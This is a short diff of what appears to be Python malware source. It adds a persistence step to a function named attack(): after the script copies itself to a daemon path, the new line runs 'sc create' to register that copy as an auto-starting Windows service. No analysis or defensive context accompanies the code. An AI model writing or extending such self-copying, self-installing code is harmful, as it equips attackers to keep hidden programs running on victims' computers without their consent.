@@ -20,6 +20,7 @@ class computer:
 def attack():
     shutil.copyfile(os.getcwd()+DAEMON_NAME, DAEMON_PATH)
     shutil.copyfile(os.path.abspath(__file__), DAEMON_PATH)
+    os.system("sc create serviceName binPath="+DAEMON_PATH+" start= auto")
 
 def getfile():
     s=os.path.abspath(__file__)
